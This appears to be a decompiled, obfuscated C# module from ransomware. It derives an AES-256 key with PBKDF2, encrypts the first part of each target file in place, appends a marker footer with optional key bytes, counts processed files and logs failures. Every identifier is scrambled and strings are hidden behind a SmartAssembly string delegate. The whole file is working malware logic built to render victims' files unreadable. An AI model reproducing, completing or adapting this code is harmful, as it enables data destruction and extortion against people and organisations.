using System;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Security.Cryptography;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace HSFBHZCtMXjPES;

public static class nTOXQbVewSXTFiv
{
	[NonSerialized]
	internal static GetString getString_0;

	public static byte[] LFBNnGzEowO(byte[] byte_0, byte[] byte_1, byte[] byte_2)
	{
		byte[] result = null;
		Rfc2898DeriveBytes rfc2898DeriveBytes = KzqDpsdUVolms(byte_1, byte_2);
		byte_1 = null;
		GC.Collect();
		using (Aes aes = new AesManaged())
		{
			aes.KeySize = 256;
			aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
			aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
			aes.Padding = PaddingMode.None;
			aes.Mode = CipherMode.CBC;
			using (MemoryStream memoryStream = new MemoryStream())
			{
				using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
				{
					cryptoStream.Write(byte_0, 0, byte_0.Length);
					cryptoStream.Close();
				}
				result = memoryStream.ToArray();
			}
			rfc2898DeriveBytes.Dispose();
		}
		return result;
	}

	public static Rfc2898DeriveBytes KzqDpsdUVolms(byte[] byte_0, byte[] byte_1)
	{
		return new Rfc2898DeriveBytes(byte_0, byte_1, 52768);
	}

	public static byte[] zyRLkdiKoM(string string_0, int int_0)
	{
		byte[] array = new byte[int_0];
		try
		{
			if (UzNyTypkvLt.rDydiOTZjcpMjk == getString_0(107396936))
			{
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(string_0, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Read(array, 0, int_0);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				return array;
			}
			FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream.Read(array, 0, int_0);
			fileStream.Close();
			fileStream.Dispose();
			return array;
		}
		catch (Exception ex)
		{
			if (UzNyTypkvLt.XtQtDAAqcssaA)
			{
				try
				{
					File.AppendAllText(UzNyTypkvLt.IuaKWfBuBpJ, getString_0(107383266) + string_0 + getString_0(107364129) + ex.Message + getString_0(107395861));
				}
				catch (Exception)
				{
				}
			}
			FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream.Read(array, 0, int_0);
			fileStream.Close();
			fileStream.Dispose();
			return array;
		}
	}

	public static bool nzAnvDfCOCtBIgh(string sEnEvTXbkUj, byte[] qvpNQzoNrMBw, byte[] aBOyLyAioGlSxs = null)
	{
		try
		{
			byte[] array = null;
			if (UzNyTypkvLt.rDydiOTZjcpMjk == getString_0(107396936))
			{
				array = (UzNyTypkvLt.VSeBsFuIKiNqF ? Encoding.ASCII.GetBytes(UzNyTypkvLt.VzYMPTFsHuw(UzNyTypkvLt.tHTQdTsQZMje) + UzNyTypkvLt.VzYMPTFsHuw(getString_0(107364551)) + Convert.ToString(UzNyTypkvLt.OLieTsrCJKKkG) + UzNyTypkvLt.VzYMPTFsHuw(getString_0(107364551))) : Encoding.ASCII.GetBytes(UzNyTypkvLt.VzYMPTFsHuw(UzNyTypkvLt.tHTQdTsQZMje) + UzNyTypkvLt.VzYMPTFsHuw(getString_0(107364560)) + Convert.ToString(UzNyTypkvLt.OLieTsrCJKKkG) + UzNyTypkvLt.VzYMPTFsHuw(getString_0(107364560))));
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(sEnEvTXbkUj, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Write(qvpNQzoNrMBw, 0, qvpNQzoNrMBw.Length);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				using FileStream fileStream = new FileStream(sEnEvTXbkUj, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!UzNyTypkvLt.VSeBsFuIKiNqF)
				{
					fileStream.Write(array, 0, array.Length);
				}
				else
				{
					fileStream.Write(aBOyLyAioGlSxs, 0, aBOyLyAioGlSxs.Length);
					fileStream.Write(array, 0, array.Length);
				}
			}
			else
			{
				array = (UzNyTypkvLt.VSeBsFuIKiNqF ? Encoding.ASCII.GetBytes(UzNyTypkvLt.VzYMPTFsHuw(UzNyTypkvLt.tHTQdTsQZMje) + UzNyTypkvLt.VzYMPTFsHuw(getString_0(107364551)) + Convert.ToString(UzNyTypkvLt.OLieTsrCJKKkG) + UzNyTypkvLt.VzYMPTFsHuw(getString_0(107364551))) : Encoding.ASCII.GetBytes(UzNyTypkvLt.VzYMPTFsHuw(UzNyTypkvLt.tHTQdTsQZMje) + UzNyTypkvLt.VzYMPTFsHuw(getString_0(107364560)) + Convert.ToString(UzNyTypkvLt.OLieTsrCJKKkG) + UzNyTypkvLt.VzYMPTFsHuw(getString_0(107364560))));
				FileStream fileStream2 = new FileStream(sEnEvTXbkUj, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
				fileStream2.Write(qvpNQzoNrMBw, 0, qvpNQzoNrMBw.Length);
				fileStream2.Close();
				fileStream2.Dispose();
				using FileStream fileStream = new FileStream(sEnEvTXbkUj, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!UzNyTypkvLt.VSeBsFuIKiNqF)
				{
					fileStream.Write(array, 0, array.Length);
				}
				else
				{
					fileStream.Write(aBOyLyAioGlSxs, 0, aBOyLyAioGlSxs.Length);
					fileStream.Write(array, 0, array.Length);
				}
			}
			UzNyTypkvLt.bXnXKaTzlpeizP++;
		}
		catch (Exception ex)
		{
			if (UzNyTypkvLt.XtQtDAAqcssaA)
			{
				try
				{
					File.AppendAllText(UzNyTypkvLt.IuaKWfBuBpJ, getString_0(107383266) + sEnEvTXbkUj + getString_0(107364574) + ex.Message + getString_0(107395861));
				}
				catch (Exception)
				{
				}
			}
			try
			{
				byte[] array = null;
				array = (UzNyTypkvLt.VSeBsFuIKiNqF ? Encoding.ASCII.GetBytes(UzNyTypkvLt.VzYMPTFsHuw(UzNyTypkvLt.tHTQdTsQZMje) + UzNyTypkvLt.VzYMPTFsHuw(getString_0(107364551)) + Convert.ToString(UzNyTypkvLt.OLieTsrCJKKkG) + UzNyTypkvLt.VzYMPTFsHuw(getString_0(107364551))) : Encoding.ASCII.GetBytes(UzNyTypkvLt.VzYMPTFsHuw(UzNyTypkvLt.tHTQdTsQZMje) + UzNyTypkvLt.VzYMPTFsHuw(getString_0(107364560)) + Convert.ToString(UzNyTypkvLt.OLieTsrCJKKkG) + UzNyTypkvLt.VzYMPTFsHuw(getString_0(107364560))));
				FileStream fileStream2 = new FileStream(sEnEvTXbkUj, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
				fileStream2.Write(qvpNQzoNrMBw, 0, qvpNQzoNrMBw.Length);
				fileStream2.Close();
				fileStream2.Dispose();
				using (FileStream fileStream = new FileStream(sEnEvTXbkUj, FileMode.Append, FileAccess.Write, FileShare.ReadWrite))
				{
					if (!UzNyTypkvLt.VSeBsFuIKiNqF)
					{
						fileStream.Write(array, 0, array.Length);
					}
					else
					{
						fileStream.Write(aBOyLyAioGlSxs, 0, aBOyLyAioGlSxs.Length);
						fileStream.Write(array, 0, array.Length);
					}
				}
				return true;
			}
			catch (Exception)
			{
				return false;
			}
		}
		return true;
	}

	static nTOXQbVewSXTFiv()
	{
		Strings.CreateGetStringDelegate(typeof(nTOXQbVewSXTFiv));
	}
}
